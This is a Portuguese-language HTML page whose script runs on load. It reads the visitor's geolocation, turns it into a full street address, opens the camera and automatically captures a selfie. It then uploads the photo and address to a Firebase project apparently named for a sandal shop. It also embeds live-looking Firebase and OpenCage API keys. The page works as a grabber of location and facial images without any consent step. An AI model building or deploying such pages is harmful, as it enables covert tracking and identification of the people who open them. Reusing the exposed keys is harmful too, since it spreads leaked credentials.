<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Captura de Dados e Envio para Firebase</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin: 20px;
    }
    #video {
      width: 300px;
      height: 200px;
      border: 1px solid #ccc;
      margin: 10px 0;
    }
    #canvas {
      display: none;
    }
  </style>
  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
</head>
<body>
  <h1>Coleta e Envio de Dados</h1>
  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
    // Configuração do Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyAWhfaY2Adp4YJGwvITWTGHP-7zOLNfiGI",
      authDomain: "sandalias-retro-9f0c6.firebaseapp.com",
      databaseURL: "https://sandalias-retro-9f0c6-default-rtdb.firebaseio.com",
      projectId: "sandalias-retro-9f0c6",
      storageBucket: "sandalias-retro-9f0c6.appspot.com",
      messagingSenderId: "786208752798",
      appId: "1:786208752798:web:193f76bbbf5ac4ef27678f",
      measurementId: "G-XGVHLX01EB",
    };

    // Inicializa Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const database = firebase.database();
    const storage = firebase.storage();

    // Referências aos elementos
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    let addressDetails = null; // Variável para guardar os detalhes do endereço

    // Função para salvar selfie no Storage
    function uploadSelfieToStorage(selfieData) {
      const storageRef = storage.ref(`selfies/selfie_${Date.now()}.png`);
      storageRef.putString(selfieData, 'data_url')
        .then(snapshot => snapshot.ref.getDownloadURL())
        .then(url => {
          alert('Selfie salva no Firebase Storage!');
          sendDataToFirebase({ ...addressDetails, selfieUrl: url });
        })
        .catch(error => {
          console.error('Erro ao salvar a selfie:', error);
          alert('Erro ao salvar a selfie no Firebase Storage.');
        });
    }

    // Captura da selfie
    function captureSelfie() {
      if (video.readyState === 4) { // Verifica se a câmera está ativa
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        const selfieData = canvas.toDataURL('image/png', 1.0); // Qualidade máxima
        if (selfieData) {
          uploadSelfieToStorage(selfieData);
        } else {
          alert('Erro ao capturar selfie.');
        }
      } else {
        alert('Câmera ainda não está pronta.');
      }
    }

    // Obter endereço completo das coordenadas
    function getAddressFromCoordinates(lat, lon) {
      const apiKey = '150e176e377d4d2ab2819ddada71dbe7';
      const url = `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${apiKey}`;

      fetch(url)
        .then(response => response.json())
        .then(data => {
          if (data.results.length > 0) {
            const result = data.results[0].components;
            addressDetails = {
              latitude: lat,
              longitude: lon,
              city: result.city || result.town || result.village || '',
              neighborhood: result.suburb || '',
              road: result.road || '',
              house_number: result.house_number || '',
              country: result.country || '',
              address: data.results[0].formatted
            };
            alert(`Endereço completo: ${addressDetails.address}`);
            captureSelfie(); // Captura selfie automaticamente após o endereço ser obtido
          } else {
            alert('Endereço não encontrado.');
          }
        })
        .catch(error => {
          alert('Erro ao obter o endereço: ' + error);
        });
    }

    // Localização do usuário
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          const { latitude, longitude } = position.coords;
          alert(`Localização obtida: Latitude ${latitude}, Longitude ${longitude}`);
          getAddressFromCoordinates(latitude, longitude);
        }, error => {
          alert('Erro ao obter a localização: ' + error.message);
        });
      } else {
        alert('Geolocalização não é suportada pelo navegador.');
      }
    }

    // Iniciar câmera
    function startCamera() {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              alert('Câmera pronta.');
              // Aguarda o endereço e então captura a selfie
              if (addressDetails) {
                captureSelfie();
              }
            };
          })
          .catch(error => {
            alert('Erro ao acessar a câmera: ' + error.message);
          });
      } else {
        alert('A câmera não é suportada pelo navegador.');
      }
    }

    // Enviar dados para o Firebase
    function sendDataToFirebase(data) {
      const reference = database.ref('userData');
      reference.push(data, function (error) {
        if (error) {
          alert('Erro ao enviar dados para o Firebase: ' + error.message);
        } else {
          alert('Dados enviados com sucesso!');
        }
      });
    }

    // Iniciar coleta de dados
    window.onload = () => {
      getLocation(); // Inicia geolocalização
      startCamera(); // Inicia a câmera
    };
  </script>
</body>
</html>
